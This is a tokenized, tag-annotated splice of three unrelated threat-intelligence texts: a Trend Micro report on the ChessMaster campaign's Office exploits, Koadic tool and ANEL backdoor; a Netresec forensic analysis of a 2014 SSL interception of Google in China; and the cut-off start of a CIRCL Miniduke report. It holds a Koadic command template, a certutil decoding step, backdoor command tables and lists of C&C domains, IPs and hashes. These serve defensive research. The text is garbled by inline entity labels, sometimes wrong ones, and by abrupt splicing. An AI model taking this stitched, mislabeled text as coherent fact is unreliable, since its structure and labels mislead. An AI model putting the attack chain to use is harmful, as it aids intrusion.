.

Read
our
security
predictions
for
2018
.

Business
Process
Compromise
Attackers
are
starting
to
invest
in
longterm
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:
Business
Process
Compromise
.

Latest
Ransomware
Posts
Digital
Extortion
:
A
Forward-looking
View
qkG B_malware.unknown
Filecoder I
:
Self-Replicating
,
Document-Encrypting
Ransomware
Bad B_malware.unknown
Rabbit I
Ransomware
Spreads
via
Network
,
Hits
Ukraine
and
Russia
A
Look
at
Locky
Ransomware
's
Recent
Spam
Activities
Magnitude
Exploit
Kit
Now
Targeting
South
Korea
With
Magniber
Ransomware

Figure
1
.

Infection
Chain
for
the
current
ChessMaster
campaign
ChessMaster
's
current
iteration
starts
off
with
the
familiar
phishing
attacks
seen
in
the
earlier
campaigns
that
involved
the
use
of
an
email
with
an
attached
malicious
document
using
the
doc
,
docx
,
rtf
,
csv
and
msg
formats
.

The
email
title
and
attached
file
name
were
written
in
Japanese
and
contain
general
business
,
political
,
and
economy-themed
phrases
such
as
世界経済
(
World
economy
)
経済政策
(
economic
policy
)
予算概算要求
(
budget
estimation
request
)
日米対話
(
Japan-US
dialogue
)
安倍再任
(
re-appointment
of
Prime
Minister
Abe
)
連絡網
(
contact
network
)
職員採用案
(
staff
recruitment
plan
)
会議
(
meeting
)
However
,
there
is
a
change
in
the
exploit
document
.

When
we
tracked
ChessMaster
back
in
November
,
we
noted
that
it
exploited
the
SOAP
WSDL
parser
vulnerability
CVE-2017-8759
(
patched
in
September
2017
)
within
the
Microsoft
.NET
framework
to
download
additional
malware
.

While
ChessMaster
still
uses
the
previous
exploit
,
it
also
added
more
methods
to
its
arsenal
:
one
exploits
another
vulnerability
,
CVE-2017-11882
(
patched
in
November
2017
)
,
which
was
also
exploited
to
deliver
illegal
versions
of
the
Loki
infostealer
.

Recent
Posts
ChessMaster
Adds
Updated
Tools
to
Its
Arsenal
Monero-Mining
HiddenMiner
Android
Malware
Can
Potentially
Cause
Device
Failure
A
Closer
Look
at
Unpopular
Software
Downloads
and
the
Risks
They
Pose
to
Organizations
Cluster
of
Coins
:
How
Machine
Learning
Detects
Cryptocurrency-mining
Malware
Pop-up
Ads
and
Over
a
Hundred
Sites
are
Helping
Distribute
Botnets
,
Cryptocurrency
Miners
and
Ransomware
Ransomware
101
This
infographic
shows
how
ransomware
has
evolved
,
how
big
the
problem
has
become
,
and
ways
to
avoid
being
a
ransomware
victim
.

Check
the
infographic
Popular
Posts
Homemade
Browser
Targeting
Banco
do
Brasil
Users
Campaign
Possibly
Connected
to
'MuddyWater
'
Surfaces
in
the
Middle
East
and
Central
Asia
Cryptocurrency
Miner
Distributed
via
PHP

Weathermap
Vulnerability
,
Targets
Linux
Servers
Monero-Mining
HiddenMiner
Android
Malware
Can
Potentially
Cause
Device
Failure
Cryptocurrency-Mining
Malware
:
2018
's
New
Menace
?

Stay
Updated
Email
Subscription
Your
email
here
Subscribe
Figure
2
.

Exploitation
of
CVE-2017-11882
It
also
abuses
three
legitimate
MS
Office
functions
:
Function
Purpose
Affected
MS
Office
Formats
we
found
in
the
Automatic
Dynamic
Data
Exchange
(
DDEAUTO
)
A
legitimate
Microsoft
Office
function
used
in
an
Office
file
to
retrieve
data
from
another
Link
Auto
Update
Office
file
An
Office
function
used
for
automatic
and
user-free
updates
for
embedded
links
upon
opening
.


wild
.doc
.rtf
.msg
.csv
Microsoft
Word
's
'Frames/Frameset
'
A
feature
that
allows
HTML
or
Text
pages
to
be
loaded
in
a
frame
within
Microsoft
Word
.

.docx
Figure
3
.

Exploitation
of
DDEAUTO
Figure
4
.

Abusing
Microsoft
Word
's
'Frames/Frameset
'
Figure
5
.

Exploitation
of
Link
Auto
Update
ChessMaster
can
utilize
any
of
these
methods
to
download
the
next
malware
in
the
chain
,
the
open
source
post-exploitation
tool
known
as
'Koadic
,
'
which
the
previous
campaign
also
used
.

This
tool
is
responsible
for
stealing
information
—
specifically
the
environment
information
—
within
the
target
system
.

Koadic
executes
the
following
command
:
%
comspec
%
/q
/c
<
cmd
>
1
>
<
Output
>
2
>
&
1
The
commands
and
output
of
Koadic
will
change
according
to
the
ANEL B_malware.backdoor
version
used
in
the
attack
.

The
table
below
lists
examples
of
the
commands
and
outputs
for
ANEL B_malware.backdoor
versions
5.1.1
rc
and
5.1.2
rc1
.

Note
that
if
ANEL B_malware.backdoor
5.1.2
rc1
was
downloaded
,
the
attacker
would
use
HTTPS
to
avoid
the
downloaded
data
being
captured
as
clear
text
.

Figure
6
.

Koadic
commands
and
output
when
ANEL B_malware.backdoor
5.1.1
rc
is
used
Figure
7
.

Koadic
commands
and
output
when
ANEL B_malware.backdoor
5.1.2
rc1
is
used
The
table
below
lists
all
of
Koadic
's
functions
:
{
Variable}.user
User-related
functions
{
Variable}.user.isElevated
Check
Privilege

{
Variable}.user.OS
Get
OS
Version
{
Variable}.user.DC
Get
DCName
from
Registry
{
Variable}.user.Arch
Get
Architecture
{
Variable}.user.info
Get
User
Information
{
Variable}.work
Main
Routine
functions
{
Variable}.work.report
Reports
to
server
{
Variable}.work.error
Returns
error
{
Variable}.work.make_url
Alters/Modifies
URL
(
C
&
C
)
{
Variable}.work.get
Get
the
return
of
POST
Header
{
Variable}.work.fork
Creates
rundll32.exe
process
{
Variable}.http
HTTP
Connection
functions
{
Variable}.http.create
Creates
initial
HTTP
objects
{
Variable}.http.post
POST
header
{
Variable}.http.addHeaders
Adds
HTTP
Headers
{
Variable}.http.get
GET
Header
{
Variable}.http.upload
Uploads
binaries/data
{
Variable}.http.bin2str
String
manipulation
{
Variable}.http.downloadEx
Downloads
response
{
Variable}.http.download
Additional
download
function

{
Variable}.process
Process-related
functions
{
Variable}.process.currentPID
Get
Current
Process
ID
{
Variable}.process.list
Enumerates
Process
{
Variable}.process.kill
Terminates
Process
{
Variable}.registry
Registry-related
functions
{
Variable}.registry.HKCR
Set
HKEY_CLASSES_ROOT
{
Variable}.registry.HKCU
Set
HKEY_CURRENT_USER
{
Variable}.registry.HKLM
Set
HKEY_LOCAL_MACHINE
{
Variable}.registry.STRING
Set
String
Value
{
Variable}.registry.BINARY
Set
Binary
Value
{
Variable}.registry.DWORD
Set
DWORD
Value
{
Variable}.registry.QWORD
Set
QWORD
Value
{
Variable}.registry.write
Write/Add
Registry
{
Variable}.registry.provider
Create
Registry
Handle
{
Variable}.registry.destroy
Deletes
Registry
Key
{
Variable}.registry.read
Get/Read
Registry
Entries
{
Variable}.WMI
WMI-related
functions
{
Variable}.WMI.createProcess
Creates
specified
process
{
Variable}.shell
File/Process
Execution
functions

{
Variable}.shell.run
Run
commands
{
Variable}.shell.exec
Executes
process
{
Variable}.file
File-related
functions
{
Variable}.file.getPath
Get
specified
file
path
{
Variable}.file.readText
Reads
specified
text
file
{
Variable}.file.get32BitFolder
Get
System
Folder
(
32/64-bit
)
{
Variable}.file.writol
Writes
on
specified
file
{
Variable}.file.deleteFile
Deletes
specified
file
{
Variable}.file.readBinary
Reads
specified
binary
file
.

Figure
8
.

Command
added
when
the
Koadic
RAT
is
downloaded
(
use
of
{
Variable}.shell.exec
command
)
If
Koadic
finds
that
the
system
is
conducive
to
the
attacker
's
interests
,
it
downloads
a
base64-encrypted
version
of
the
ANEL B_malware.backdoor
malware
from
the
Command-and-Control
(
C
&
C
)
server
and
executes
it
.

Encrypted
ANEL B_malware.backdoor
is
decrypted
using
the
'certutil
-docode
'
command
.

When
ANEL B_malware.backdoor
executes
,
a
decrypted
DLL
file
with
the
filename
'lena_http_dll.dll
'
is
expanded
in
memory
.

This
file
contains
one
export
function
—
either
'crt_main
'
or
'lena_main
'

Figure
9
.

Base64
encoded
ANEL B_malware.backdoor
downloaded
by
Koadic
ANEL B_malware.backdoor
will
send
the
infected
environment
's
information
to
the
C
&
C
server
.

When
sending
the
information
,
ANEL B_malware.backdoor
encrypts
the
data
using
blowfish
,
XOR
,
and
Base64-based
encryption
methods
.

The
format
ANEL B_malware.backdoor
uses
to
send
data
is
similar
to
ChChes B_malware.backdoor
,
but
ANEL B_malware.backdoor
's
encryption
method
is
easier
to
use
.

Figure
10
.

Encryption
key
using
blowfish
We
initially
discovered
the
malware
known
as
ANEL B_malware.backdoor
back
in
November
2017
.

At
that
time
,
ChessMaster
was
using
ANEL B_malware.backdoor
as
a
backdoor
into
the
target
system
then
injects
code
into
svchost.exe
,
which
then
decrypts
and
activates
the
embedded
backdoor
.

This
initial
version
of
ANEL B_malware.backdoor
had
a
hardcoded
version
labeled
'5.0.0
beta1
'
that
contained
incomplete
code
.

We
noted
that
this
might
signify
the
release
of
a
future
variant
.

Instead
of
just
one
new
variant
,
we
discovered
four
different
versions
of
ANEL B_malware.backdoor
:
5.0.0
beta1
5.1.1
rc
5.1.2
rc1
5.2.0
rev1
The
different
versions
contain
changes
in
the
ANEL B_malware.backdoor
loader
and
the
main
ANEL B_malware.backdoor
DLL
.

The
figure
below
shows
a
summary
of
the
changes
between
each
version
:

Figure
11
.

Summary
of
the
changes
between
each
version
of
ANEL B_malware.backdoor
Differences
with
regards
to
Backdoor
commands
:
CMD
ID
5.0.0
beta1/5.1.1
rc/5.1.2
5.2.0
rev1
0x97A168D9697D40DD B_hash
0x7CF812296CCC68D5 B_hash
0x652CB1CEFF1C0A00 B_hash
0x27595F1F74B55278 B_hash
rc1
NA
Save
File
Upload
File
Load
New
PE
file
Save
File
and
Execute
If
no
match
above
Execute
Command
or
File
The
differences
shown
in
the
table
above
are
subtle
but
present
.

For
example
,
the
initial
ANEL B_malware.backdoor
version
,
'5.0.0
beta1
,
'
uses
a
different
C
&
C
server
compared
to
the
other
versions
.

Once
ANEL B_malware.backdoor
evolved
to
'5.1.1
rc
,
'
it
changed
its
file
type
to
an
executable
,
while
also
changing
the
C
&
C
server
.

The
third
version
we
found
(
5.1.2
rc1
)
reverts
to
a
DLL
file
type
but
retains
the
C
&
C
server
.

The
fourth
version
of
ANEL B_malware.backdoor
(
5.2.0
rev1
)
changes
both
the
export
function
in
the
expanded
main
ANEL B_malware.backdoor
DLL
and
uses
a
different
C
&
C
server
.

Overall
,
we
can
see
subtle
changes
,
which
indicate
that
the
threat
actors
behind
ANEL B_malware.backdoor
are
making
incremental
improvements
to
the
malware
to
refine
it
.

Figure
12
.

Backdoor
function
differences
between
ANEL B_malware.backdoor
5.0.0
beta1/5.1.1
rc/5.1.2
rc1
(
left
)
and
ANEL B_malware.backdoor
5.2.0
rev1
(
right
)
Once
ANEL B_malware.backdoor
enters
the
user
's
system
,
it
will
download
various
tools
that
could
be
used
for
malicious
purposes
,
including
password
retrieval
tools
as
well
as
malicious
mail
services
and
accessibility
tools
that
will
allow
it
to
gather
information
about
the
system
.

These
include
Getpass.exe
and
Mail.exe
,
which
are
password
and
information
stealers
.

It
also
downloads
the
following
:
Accevent.exe
<
-
>
Microsoft
Accessible
Event
Watcher
7.2.0.0
event.dll
<
-
>
the
loader
of
ssssss.ddd
,
(
Detected
as
TROJ_ANELLDR
)

ssssss.ddd
(
lena_http.bin
)
<
-
>
encrypted
BKDR_ANEL
(
Detected
as
BKDR_ANELENC
)
These
three
files
work
together
using
a
common
technique
call
DLL
Side-Loading
or
DLL
Hijacking
.

In
this
scenario
,
accevent.exe
is
the
primary
executable
,
which
is
usually
legitimate
.

After
the
execution
of
accevent.exe
,
it
loads
event.dll
,
which
will
be
placed
in
the
same
folder
(
so
it
takes
loading
priority
)
,
after
which
event.dll
decrypts
and
loads
the
encrypted
backdoor
ssssss.ddd
,
which
is
BKDR_ANEL
.

When
we
analyzed
ANEL B_malware.backdoor
5.1.1
rc
,
encrypted
ANEL B_malware.backdoor
5.1.2
rc1
was
downloaded
and
executed
.

Short-term
mitigation
When
the
user
opens
the
document
DDEAUTO
or
Link
Auto
Update
,
Office
will
display
a
message
.

If
the
user
clicks
on
the
'No
'
button
,
malicious
activity
will
not
initiate
.

Figure
13
:
Popup
message
when
users
open
the
document
that
abuses
DDEAUTO

Figure
14
.

Popup
message
when
the
user
opens
the
document
that
abuses
Link
Auto
Update
Koadic
sends
its
own
JavaScript
code
as
plain
text
.

The
suspect
communication
allows
us
to
detect
the
traffic
.

Figure
15
.

Koadic
's
communication
traffic
Medium-
to
long-term
mitigation
At
first
glance
,
it
seems
ChessMaster
's
evolution
over
the
past
few
months
involves
subtle
changes
.

However
,
the
constant
addition
and
changing
of
features
and
attack
vectors
indicate
that
the
attackers
behind
the
campaign
are
unlikely
to
stop
and
are
constantly
looking
to
evolve
their
tools
and
tactics
.

Organizations
can
implement
various
techniques
and
best
practices
to
defend
against
targeted
attacks
,
such
as
regular
patching
to
prevent
vulnerability
exploitation
and
using
tools
that
provide
protection
across
different
network
levels
.

Solutions
that
feature
behavior
monitoring
,
application
control
,
email
gateway
monitoring
,
and
intrusion/detection
systems
can
help
with
this
.

Given
how
cybercriminal
tools
,
tactics
and
procedures
are
evolving
,
organizations
will
have
to
go
beyond
their
typical
day-to-day
security
requirements
and
find
a
way
to
preempt
attacks
.

Thus
,
there
is
a
pressing
need
to
detect
and
address
threats
via
a
proactive
incident
response
strategy
.


Essentially
,
this
involves
creating
a
remediation
plan
for
effectively
combating
the
threat
and
using
round-the-clock
intrusion
detection
and
threat
analysis
to
prevent
attacks
from
entering
the
system
.

A
proactive
strategy
can
be
much
more
effective
for
targeted
attacks
,
as
these
kinds
of
attacks
are
often
designed
to
be
elusive
and
difficult
to
detect
,
thus
the
need
to
scope
them
out
.

A
comprehensive
security
strategy
that
involves
proactive
incident
response
will
need
the
input
of
both
decision
makers
and
tech-savvy
personnel
,
as
they
will
need
to
be
on
the
same
page
for
it
to
be
effective
.

In
addition
to
implementing
both
mitigation
techniques
and
proactive
strategies
,
organizations
can
also
strengthen
their
security
by
employing
solutions
such
Trend
MicroTM
Deep
SecurityTM
,
Vulnerability
Protection
,
and
TippingPoint
,
which
protects
endpoints
from
threats
that
abuse
vulnerabilities
.

In
addition
,
comprehensive
security
solutions
can
be
used
to
protect
organizations
from
attacks
.

These
include
Trend
Micro
endpoint
solutions
such
as
Trend
MicroTM
Smart
Protection
Suites
and
Worry-FreeTM
Business
Security
,
which
can
protect
users
and
businesses
from
these
threats
by
detecting
malicious
files
,
well
as
blocking
all
related
malicious
URLs
.

Trend
Micro
Deep
DiscoveryTM
can
protect
enterprises
by
detecting
malicious
attachment
and
URLs
.

Trend
Micro
OfficeScanTM
with
XGenTM
endpoint
security
infuses
high-fidelity
machine
learning
with
other
detection
technologies
and
global
threat
intelligence
for
comprehensive
protection
against
all
kinds
of
threats
.

A
more
detailed
analysis
of
the
Command-and-Control
communication
flow
of
ANEL B_malware.backdoor
can
be
found
in
this
>
technical
brief
.

Indicators
of
Compromise
Hash
Downloader
used
in
the
campaign
:
76b1f75ee15273d1226392db3d8f1b2aed467c2875e11d9c14fd18120afc223a B_hash
4edcff56f586bd69585e0c9d1d7ff4bfb1a2dac6e2a9588f155015ececbe1275 B_hash
1b5a1751960b2c08631601b07e3294e4c84dfd71896453b65a45e4396a6377cc B_hash
Hashes
detected
as
part
of
the
BKDR_ANEL
Family
:
5.0.0
beta1
af1b2cd8580650d826f48ad824deef3749a7db6fde1c7e1dc115c6b0a7dfa0dd B_hash
5.1.1
rc

2371f5b63b1e44ca52ce8140840f3a8b01b7e3002f0a7f0d61aecf539566e6a1 B_hash
5.1.2
rc1
05dd407018bd316090adaea0855bd7f7c72d9ce4380dd4bc0feadc6566a36170 B_hash
5.2.0
rev1
00030ec8cce1f21120ebf5b90ec408b59166bbc3fba17ebae0fc23b3ca27bf4f B_hash
lena_http.bin
303f9c00edb4c6082542e456a30a2446a259b8bb9fb6b0f76ff318d5905e429c B_hash
Tools
used
in
the
campaign
:
Getpass.exe
52a8557c8cdd5d925453383934cb10a85b117522b95c6d28ca097632ac8bc10d B_hash
event.dll
6c3224dbf6bbabe058b0ab46233c9d35c970aa83e8c4bdffb85d78e31159d489 B_hash
mail.exe
2f76c9242d5ad2b1f941fb47c94c80c1ce647df4d2d37ca2351864286b0bb3d8 B_hash
URLs
and
IP
Addresses
related
to
the
campaign
:
www[.]nasnnones[.]com B_url.unknown
trems[.]rvenee[.]com B_url.unknown
contacts[.]rvenee[.]com B_url.unknown
91[.]207[.]7[.]91 B_ip.unknown
89[.]18[.]27[.]159 B_ip.unknown
89[.]37[.]226[.]108 B_ip.unknown
185[.]25[.]51[.]116 B_ip.unknown
185[.]81[.]113[.]95 B_ip.unknown
185[.]144[.]83[.]82 B_ip.unknown
185[.]153[.]198[.]58 B_ip.unknown
185[.]159[.]129[.]226 B_ip.unknown

Related
Posts
:
Related
Posts
:
ChessMaster
Makes
its
Move
:
A
Look
into
the
Campaign
's
Cyberespionage
Arsenal
ChessMaster
's
New
Strategy
:
Evolving
Tools
and
Tactics
From
Cybercrime
to
Cyberpropaganda
Apps
Disguised
as
Security
Tools
Bombard
Users
With
Ads
and
Track
Users
'
Location
Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:
ENTERPRISE
'
SMALL
BUSINESS
'
HOME
'
Tags
:
ChessMaster
targeted
attacks

HOME
AND
HOME
OFFICE
|
FOR
BUSINESS
|
SECURITY
INTELLIGENCE
|
ABOUT
TREND
MICRO
Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣
Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schw
eiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland
Latin
America
Region
(
LAR
)
:
Brasil
,
México
North
America
Region
(
NABU
)
:
United
States
,
Canada
Privacy
Statement
Legal
Policies
Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.
Analysis
of
Chinese
MITM B_malware.unknown
on
Google
Thursday
,
04
September
2014
23:55:00
(
UTC/GMT
)
The
Chinese
are
running
a
MITM B_malware.unknown
attack
on
SSL
encrypted
traffic
between
Chinese
universities
and
Google
.

We
've
performed
technical
analysis
of
the
attack
,
on
request
from
GreatFire.org B_url.normal
,
and
can
confirm
that
it
is
a
real
SSL B_malware.unknown
MITM I
against
www.google.com B_url.normal
and
that
it
is
being
performed
from
within
China
.

We
were
contacted
by
GreatFire.org B_url.normal
yesterday
(
September
3
)
with
a
request
to
analyze
two
packet
captures
from
suspected
MITM-attacks
before
they
finalized
their
blog
post
.

The
conclusions
from
our
analysis
is
now
published
as
part
of
GreatFire.org's B_url.normal
great
blog
post
titled
'Authorities
launch
man-in-the-middle
attack
on
Google
'
.

In
their
blog
post
GreatFire.org B_url.normal
write
:
From
August
28
,
2014
reports
appeared
on
Weibo
and
Google
Plus
that
users
in
China
trying
to
access
google.com B_url.normal
and
google.com.hk B_url.normal
via
CERNET
,
the
country
's
education
network
,
were
receiving
warning
messages
about
invalid
SSL
certificates
.

The
evidence
,
which
we
include
later
in
this
post
,
indicates
that
this
was
caused
by
a
man-in-the-middle
attack
.

While
the
authorities
have
been
blocking
access
to
most
things
Google
since
June
4th
,
they
have
kept
their
hands
off
of
CERNET
,
China
's
nationwide
education
and
research
network
.

However
,
in
the
lead
up
to
the
new
school
year
,
the
Chinese
authorities
launched
a
man-in-the-middle
(
MITM B_malware.unknown
)
attack
against
Google
.

Our
network
forensic
analysis
was
performed
by
investigating
the
following
to
packet
capture
files
:
Capture
Location
Client
Netname
Capture
Date
Filename
MD5
Peking
University
Chongqing
University
PKU6-CERNET2
Aug
30
,
2014
google.com.pcap
CQU6-CERNET2
Sep
1
,
2014
aba4b35cb85ed218 B_hash
7a8a7656cd670a93 B_hash
google_fake.pcapng B_hash
3bf943ea453f9afa B_hash
5c06b9c126d79557 B_hash
Client
and
Server
IP
adresses
The
analyzed
capture
files
contain
pure
IPv6
traffic
(
CERNET
is
a
IPv6
network
)
which
made
the
analysis
a
bit
different
then
usual
.

We
do
not
disclose
the
client
IP
addresses
for
privacy
reasons
,
but
they
both
seem
legit
;
one
from
Peking
University
(
netname
PKU6-CERNET2
)
and
the
other
from
Chongqing
University
(
CQU6-CERNET2
)
.

Both
IP
addresses
belong
to
AS23910
,
named
'China
Next
Generation
Internet
CERNET2
'
.

Peking
University
entrance
,
by
galaygobi
(
Creative
Commons
Attribution
2.0
)
Chongqing
University
gate
,
by
Brooktse
(
Creative
Commons
Attribution-Share
Alike
3.0
)
The
IP
addresses
received
for
www.google.com B_url.normal
were
in
both
cases
also
legit
,
so
the
MITM B_malware.unknown
was
n't
carried
out
through
DNS
spoofing
.

The
Peking
University
client
connected
to
2607 B_ip.normal
:
f8b0:4007:804 I
:
:1013 I
(
GOOGLE-IPV6
in
United
States
)
and
the
connection
from
Chongqing
University
went
to
2404:6800:4005:805 B_ip.normal
:
:1010
(
GOOGLE_IPV6_AP-20080930
in
Australia
)
.

Time-To-Live
(
TTL
)
Analysis
The
Time-To-Live
(
TTL
)
values
received
in
the
IP
packets
from
www.google.com B_url.normal
were
in
both
cases
248
or
249
(
note
:
TTL
is
actually
called
'Hop
Limit
'
in
IPv6
nomenclature
,
but
we
prefer
to
use
the
well
established
term
'TTL
'
anyway
)
.

The
highest
possible
TTL
value
is
255
,
this
means
that
the
received
packets
have
n't
made
more
than
6
or
7
router
hops
before
ending
up
at
the
client
.

However
,
the
expected
number
of
router
hops
between
a
server
on
GOOGLE-IPV6
and
the
client
at
Peking
University
is
around
14
.

The
low
number
of
router
hops
is
is
a
clear
indication
of
an
IP
MITM B_malware.unknown
taking
place
.

CapLoader
with
both
capture
files
loaded
,
showing
TTL
values
Here
is
an
IPv6
traceroute
from
AS25795
in
Los
Angeles
towards
the
IP
address
at
Peking
University
(
generated
with
ARP
Networks
'
4or6.com
tool
)
:
#
traceroute
-6
2001
:
da8
:
[
REDACTED
]
1
2607
:
f2f8:1600
:
:1
(
2607
:
f2f8:1600
:
:1
)
1.636
ms
1.573
ms
1.557
ms
2
2001:504:13
:
:1a
(
2001:504:13
:
:1a
)
40.381
ms
40.481
ms
40.565
ms
3
*
*
*
4
2001:252:0:302
:
:1
(
2001:252:0:302
:
:1
)
148.409
ms
148.501
ms
148.595
ms
5
*
*
*
6
2001:252:0:1
:
:1
(
2001:252:0:1
:
:1
)
148.273
ms
147.620
ms
147.596
ms
7
pku-bj-v6.cernet2.net
(
2001
:
da8:1:1b
:
:2
)
147.574
ms
147.619
ms
147.420
ms
8
2001
:
da8:1:50d
:
:2
(
2001
:
da8:1:50d
:
:2
)
148.582
ms
148.670
ms
148.979
ms
9
cernet2.net
(
2001
:
da8
:
ac
:
ffff
:
:2
)
147.963
ms
147.956
ms
147.988
ms
10
2001
:
da8
:
[
REDACTED
]
147.964
ms
148.035
ms
147.895
ms
11
2001
:
da8
:
[
REDACTED
]
147.832
ms
147.881
ms
147.836
ms
12
2001
:
da8
:
[
REDACTED
]
147.809
ms
147.707
ms
147.899
ms
As
can
be
seen
in
the
traceroute
above
,
seven
hops
before
the
client
we
find
the
2001:252
:
:/32
network
,
which
is
called
'CNGI
International
Gateway
Network
(
CNGIIGN
)
'
.

This
network
is
actually
part
of
CERNET
,
but
on
AS23911
,
which
is
the
network
that
connects
CERNET
with
its
external
peers
.

A
reasonable
assumption
is
therefore
that
the
MITM B_malware.unknown
is
carried
out
on
the
2001:252
:
:/32
network
,
or
where
AS23910
(
2001
:
da8:1
:
:2
)
connects
to
AS23911
(
2001:252:0:1
:
:1
)
.

This
means
that
the
MITM B_malware.unknown
attack
is
being
conducted
from
within
China
.

Response
Time
Analysis
The
round-trip
time
between
the
client
and
server
can
be
estimated
by
measuring
the
time
from
when
the
client
sends
it
initial
TCP
SYN
packet
to
when
it
receives
a
TCP
SYN+ACK
from
the
server
.

The
expected
round-trip
time
for
connecting
from
CERNET
to
a
Google
server
overseas
would
be
around
150ms
or
more
.

However
,
in
the
captures
we
've
analyzed
the
TCP
SYN+ACK
package
was
received
in
just
8ms
(
Peking
)
and
52ms
(
Chongqing
)
respectively
.

Again
,
this
is
a
clear
indication
of
an
IP
MITM B_malware.unknown
taking
place
,
since
Google
can
not
possibly
send
a
response
from
the
US
to
CERNET
within
8ms
regardless
of
how
fast
they
are
.

The
fast
response
times
also
indicate
that
the
machine
performing
the
MITM B_malware.unknown
is
located
fairly
close
to
the
network
at
Peking
University
.

Even
though
the
machine
performing
the
MITM B_malware.unknown
was
very
quick
at
performing
the
TCP
tree-way
handshake
we
noticed
that
the
application
layer
communication
was
terribly
slow
.

The
specification
for
the
TLS
handshake
(
RFC
2246
)
defines
that
a
ClientHello
message
should
be
responded
to
with
a
ServerHello
.

Google
typically
send
their
ServerHello
response
almost
instantly
,
i.e.
the
response
is
received
after
one
round-trip
time
(
150ms
in
this
case
)
.

However
,
in
the
analyzed
captures
we
noticed
ServerHello
response
times
of
around
500ms
.

X.509
Certificate
analysis
We
extracted
the
X.509
certificates
from
the
two
capture
files
to
.cer
files
using
NetworkMiner
.

We
noticed
that
both
users
received
identical
certificates
,
which
were
both
self
signed
for
'google.com B_url.normal
'
.

The
fact
that
the
MITM B_malware.unknown
used
a
self
signed
certificate
makes
the
attack
easily
detectable
even
for
the
nontechnical
user
,
since
the
web
browser
will
typically
display
a
warning
about
the
site
not
being
trusted
.

Additionally
the
X.509
certificate
was
created
for
'google.com B_url.normal
'
rather`
than
'*.google.com B_url.normal
'
.

This
is
an
obvious
miss
from
the
MITM'ers B_malware.unknown
side
since
they
were
attempting
to
MITM B_malware.unknown
traffic
to
'www.google.com B_url.normal
'
but
not
to
'google.com B_url.normal
'
.

NetworkMiner
showing
list
of
X.509
certificates
extracted
from
the
two
PCAP
files
Certificate
SHA1
fingerprint
:
f6beadb9bc02e0a152d71c318739cdecfc1c085d B_hash
Certificate
MD5
fingerprint
:
66
:
D5
:
D5:6A
:
E9:28:51:7C:03:53
:
C5
:
E1:33:14
:
A8:3B
A
copy
of
the
fake
certificate
is
available
on
Google
drive
thanks
to
GreatFire.org B_url.normal
.

Conclusions
All
evidence
indicates
that
a
MITM B_malware.unknown
attack
is
being
conducted
against
traffic
between
China
's
nationwide
education
and
research
network
CERNET
and
www.google.com B_url.normal
.

It
looks
as
if
the
MITM B_malware.unknown
is
carried
out
on
a
network
belonging
to
AS23911
,
which
is
the
outer
part
of
CERNET
that
peers
with
all
external
networks
.

This
network
is
located
in
China
,
so
we
can
conclude
that
the
MITM B_malware.unknown
was
being
done
within
the
country
.

It
's
difficult
to
say
exactly
how
the
MITM B_malware.unknown
attack
was
carried
out
,
but
we
can
dismiss
DNS
spoofing
as
the
used
method
.

The
evidence
we
've
observed
instead
indicate
that
the
MITM B_malware.unknown
attack
is
performed
either
by
performing
IP
hijacking
or
by
simply
reconfiguring
a
router
to
forward
the
HTTPS
traffic
to
a
transparent
SSL
proxy
.

An
alternative
to
changing
the
router
config
would
also
be
to
add
an
in-line
device
that
redirects
the
desired
traffic
to
the
SSL
proxy
.

However
,
regardless
of
how
they
did
it
the
attacker
would
be
able
to
decrypt
and
inspect
the
traffic
going
to
Google
.

We
can
also
conclude
that
the
method
used
to
perform
the
MITM B_malware.unknown
attack
was
similar
to
the
Chinese
MITM B_malware.unknown
on
GitHub
,
but
not
identical
.

Share
|
Short
URL
:
http://netresec.com/?b=14955CB B_url.normal
Posted
by
Erik
Hjelmvik
on
Thursday
,
04
September
2014
23:55:00
(
UTC/GMT
)
Analysis
Report
(
TLP
:
WHITE
)
Analysis
of
a
stage
3
Miniduke
sample
Conducted
by
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
May
30
,
2013
,
with
an
update
on
Jul
03
,
2014
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
Contents
1
Scope
of
work
2
Analyzed
samples
2.1
Limitations
2.2
Sharing
3
Executive
summary
4
Analysis
4.1
Summary
4.2
Techniques
used
Implemented
commands
4.3
4.4
Control
IOC
4.5
4.5.1
Network
4.5.2
Registry
4.6
Persistency
4.7
Execution
process
5
Interesting
code
parts
5.1
Init
phase
of
Sample
B
5.2
Decrypt
and
setup
registry
keys
evaluate
commands
(
extract
)
and
error
handling
5.3
5.4
Internet
connect
5.5
Create
process
calls
6
Related
indicators
information
6.1
Network
infrastructure
33444444455566688899
10
10
10
Page
2
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
1
Scope
of
work
In
the
scope
of
targeted
attacks
with
a
malware
labeled
as
Miniduke
by
Kaspersky
Labs
,
CIRCL
was
interested
in
the
way
the
malware
's
later
stages
work
and
what
kind
of
interesting
information
they
reveal
(
e.g.
techniques
,
style
,
IOCs)
.
No
public
analysis
was
found
except
the
mention
in
Kaspersky
's
report
of
a
custom
backdoor
,
so
CIRCL
took
one
of
the
known
samples
and
started
this
analysis
.

2
Analyzed
samples
•
Sample
A
-
Stage
3
sample
from
Kaspersky
reports
–
Description
*
Hash
found
in
Kaspersky
Lab
report
1
–
Original
filename
*
v1.ex_
–
Hashes
*
MD5
:
1e1b0d16a16cf5c7f3a7c053ce78f515
*
SHA1
:
de8e9def2553f4d211cc0b34a3972d9814f156aa
*
SHA-256
:
